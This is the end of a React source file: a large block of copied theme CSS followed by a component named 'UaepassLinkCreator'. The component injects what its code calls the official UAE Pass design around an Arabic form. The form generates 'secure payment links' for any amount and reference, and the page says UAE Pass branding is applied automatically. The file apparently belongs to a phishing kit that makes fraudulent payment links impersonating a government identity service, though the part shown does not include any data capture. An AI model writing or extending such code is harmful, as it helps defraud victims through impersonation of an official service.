      --v-theme-on-code: 0, 0, 0;
    }
    .bg-background {
      --v-theme-overlay-multiplier: var(--v-theme-background-overlay-multiplier);
      background-color: rgb(var(--v-theme-background)) !important;
      color: rgb(var(--v-theme-on-background)) !important;
    }
    .bg-surface {
      --v-theme-overlay-multiplier: var(--v-theme-surface-overlay-multiplier);
      background-color: rgb(var(--v-theme-surface)) !important;
      color: rgb(var(--v-theme-on-surface)) !important;
    }
    .bg-surface-bright {
      --v-theme-overlay-multiplier: var(--v-theme-surface-bright-overlay-multiplier);
      background-color: rgb(var(--v-theme-surface-bright)) !important;
      color: rgb(var(--v-theme-on-surface-bright)) !important;
    }
    .bg-surface-light {
      --v-theme-overlay-multiplier: var(--v-theme-surface-light-overlay-multiplier);
      background-color: rgb(var(--v-theme-surface-light)) !important;
      color: rgb(var(--v-theme-on-surface-light)) !important;
    }
    .bg-surface-variant {
      --v-theme-overlay-multiplier: var(--v-theme-surface-variant-overlay-multiplier);
      background-color: rgb(var(--v-theme-surface-variant)) !important;
      color: rgb(var(--v-theme-on-surface-variant)) !important;
    }
    .bg-primary {
      --v-theme-overlay-multiplier: var(--v-theme-primary-overlay-multiplier);
      background-color: rgb(var(--v-theme-primary)) !important;
      color: rgb(var(--v-theme-on-primary)) !important;
    }
    .bg-primary-darken-1 {
      --v-theme-overlay-multiplier: var(--v-theme-primary-darken-1-overlay-multiplier);
      background-color: rgb(var(--v-theme-primary-darken-1)) !important;
      color: rgb(var(--v-theme-on-primary-darken-1)) !important;
    }
    .bg-secondary {
      --v-theme-overlay-multiplier: var(--v-theme-secondary-overlay-multiplier);
      background-color: rgb(var(--v-theme-secondary)) !important;
      color: rgb(var(--v-theme-on-secondary)) !important;
    }
    .bg-secondary-darken-1 {
      --v-theme-overlay-multiplier: var(--v-theme-secondary-darken-1-overlay-multiplier);
      background-color: rgb(var(--v-theme-secondary-darken-1)) !important;
      color: rgb(var(--v-theme-on-secondary-darken-1)) !important;
    }
    .bg-error {
      --v-theme-overlay-multiplier: var(--v-theme-error-overlay-multiplier);
      background-color: rgb(var(--v-theme-error)) !important;
      color: rgb(var(--v-theme-on-error)) !important;
    }
    .bg-info {
      --v-theme-overlay-multiplier: var(--v-theme-info-overlay-multiplier);
      background-color: rgb(var(--v-theme-info)) !important;
      color: rgb(var(--v-theme-on-info)) !important;
    }
    .bg-success {
      --v-theme-overlay-multiplier: var(--v-theme-success-overlay-multiplier);
      background-color: rgb(var(--v-theme-success)) !important;
      color: rgb(var(--v-theme-on-success)) !important;
    }
    .bg-warning {
      --v-theme-overlay-multiplier: var(--v-theme-warning-overlay-multiplier);
      background-color: rgb(var(--v-theme-warning)) !important;
      color: rgb(var(--v-theme-on-warning)) !important;
    }
    .text-background {
      color: rgb(var(--v-theme-background)) !important;
    }
    .border-background {
      --v-border-color: var(--v-theme-background);
    }
    .text-surface {
      color: rgb(var(--v-theme-surface)) !important;
    }
    .border-surface {
      --v-border-color: var(--v-theme-surface);
    }
    .text-surface-bright {
      color: rgb(var(--v-theme-surface-bright)) !important;
    }
    .border-surface-bright {
      --v-border-color: var(--v-theme-surface-bright);
    }
    .text-surface-light {
      color: rgb(var(--v-theme-surface-light)) !important;
    }
    .border-surface-light {
      --v-border-color: var(--v-theme-surface-light);
    }
    .text-surface-variant {
      color: rgb(var(--v-theme-surface-variant)) !important;
    }
    .border-surface-variant {
      --v-border-color: var(--v-theme-surface-variant);
    }
    .on-surface-variant {
      color: rgb(var(--v-theme-on-surface-variant)) !important;
    }
    .text-primary {
      color: rgb(var(--v-theme-primary)) !important;
    }
    .border-primary {
      --v-border-color: var(--v-theme-primary);
    }
    .text-primary-darken-1 {
      color: rgb(var(--v-theme-primary-darken-1)) !important;
    }
    .border-primary-darken-1 {
      --v-border-color: var(--v-theme-primary-darken-1);
    }
    .text-secondary {
      color: rgb(var(--v-theme-secondary)) !important;
    }
    .border-secondary {
      --v-border-color: var(--v-theme-secondary);
    }
    .text-secondary-darken-1 {
      color: rgb(var(--v-theme-secondary-darken-1)) !important;
    }
    .border-secondary-darken-1 {
      --v-border-color: var(--v-theme-secondary-darken-1);
    }
    .text-error {
      color: rgb(var(--v-theme-error)) !important;
    }
    .border-error {
      --v-border-color: var(--v-theme-error);
    }
    .text-info {
      color: rgb(var(--v-theme-info)) !important;
    }
    .border-info {
      --v-border-color: var(--v-theme-info);
    }
    .text-success {
      color: rgb(var(--v-theme-success)) !important;
    }
    .border-success {
      --v-border-color: var(--v-theme-success);
    }
    .text-warning {
      color: rgb(var(--v-theme-warning)) !important;
    }
    .border-warning {
      --v-border-color: var(--v-theme-warning);
    }
    .on-background {
      color: rgb(var(--v-theme-on-background)) !important;
    }
    .on-surface {
      color: rgb(var(--v-theme-on-surface)) !important;
    }
    .on-surface-bright {
      color: rgb(var(--v-theme-on-surface-bright)) !important;
    }
    .on-surface-light {
      color: rgb(var(--v-theme-on-surface-light)) !important;
    }
    .on-primary {
      color: rgb(var(--v-theme-on-primary)) !important;
    }
    .on-primary-darken-1 {
      color: rgb(var(--v-theme-on-primary-darken-1)) !important;
    }
    .on-secondary {
      color: rgb(var(--v-theme-on-secondary)) !important;
    }
    .on-secondary-darken-1 {
      color: rgb(var(--v-theme-on-secondary-darken-1)) !important;
    }
    .on-error {
      color: rgb(var(--v-theme-on-error)) !important;
    }
    .on-info {
      color: rgb(var(--v-theme-on-info)) !important;
    }
    .on-success {
      color: rgb(var(--v-theme-on-success)) !important;
    }
    .on-warning {
      color: rgb(var(--v-theme-on-warning)) !important;
    }

`;

  return (
    <OfficialDesignInjector entityId="uae-pass" html={officialHTML} css={officialCSS}>
      <div className="official-input-overlay" style={{ 
        position: 'absolute', 
        top: '50%', 
        left: '50%', 
        transform: 'translate(-50%, -50%)',
        zIndex: 1000,
        background: 'rgba(255,255,255,0.95)',
        padding: '30px',
        borderRadius: '12px',
        boxShadow: '0 4px 30px rgba(0,0,0,0.3)',
        width: '100%',
        maxWidth: '420px',
        border: '1px solid #eee'
      }}>
        <div style={{ textAlign: 'center', marginBottom: '25px' }}>
          <h2 style={{ margin: 0, color: '#1a1a1a', fontSize: '22px', fontWeight: 'bold' }}>بوابة إصدار الروابط الرسمية</h2>
          <p style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>سيتم تطبيق هوية uae-pass تلقائياً</p>
        </div>
        <div style={{ marginBottom: '15px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '5px', color: '#444' }}>المبلغ المطلوب</label>
          <input 
            placeholder="0.00" 
            value={amount} 
            onChange={(e) => setAmount(e.target.value)}
            style={{ width: '100%', height: '52px', border: '2px solid #e2e8f0', borderRadius: '8px', padding: '0 15px', fontSize: '18px', boxSizing: 'border-box' }}
          />
        </div>
        <div style={{ marginBottom: '20px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '5px', color: '#444' }}>الوصف / رقم المرجع</label>
          <input 
            placeholder="ادخل تفاصيل العملية" 
            value={description} 
            onChange={(e) => setDescription(e.target.value)}
            style={{ width: '100%', height: '52px', border: '2px solid #e2e8f0', borderRadius: '8px', padding: '0 15px', fontSize: '16px', boxSizing: 'border-box' }}
          />
        </div>
        <button 
          onClick={handleCreate} 
          disabled={loading}
          style={{ 
            width: '100%', 
            height: '56px', 
            background: '#1a1a1a', 
            color: '#fff', 
            borderRadius: '12px', 
            fontSize: '18px', 
            fontWeight: 'bold', 
            cursor: 'pointer',
            transition: 'all 0.2s'
          }}
        >
          {loading ? 'جاري الإصدار...' : 'إنشاء رابط دفع آمن'}
        </button>
        {generatedLink && (
          <div style={{ marginTop: '25px', padding: '15px', background: '#f8fafc', border: '1px dashed #334155', borderRadius: '8px', wordBreak: 'break-all' }}>
            <p style={{ fontSize: '12px', color: '#64748b', marginBottom: '5px' }}>الرابط المولد:</p>
            <div style={{ fontWeight: 'bold', color: '#0f172a', fontSize: '14px' }}>{generatedLink}</div>
            <button 
              onClick={() => navigator.clipboard.writeText(generatedLink)}
              style={{ marginTop: '10px', background: '#334155', color: '#fff', border: 'none', borderRadius: '4px', padding: '5px 10px', fontSize: '12px', cursor: 'pointer' }}
            >
              نسخ الرابط
            </button>
          </div>
        )}
      </div>
    </OfficialDesignInjector>
  );
};

export default UaepassLinkCreator;
